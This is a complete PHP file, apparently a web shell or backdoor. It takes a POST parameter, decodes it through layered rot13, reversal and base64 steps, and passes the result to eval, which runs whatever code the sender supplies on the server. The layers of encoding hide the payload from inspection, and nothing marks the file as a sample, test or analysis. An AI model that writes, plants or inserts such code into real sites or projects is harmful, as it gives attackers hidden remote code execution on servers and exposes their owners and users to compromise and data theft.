<?php 
eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
?>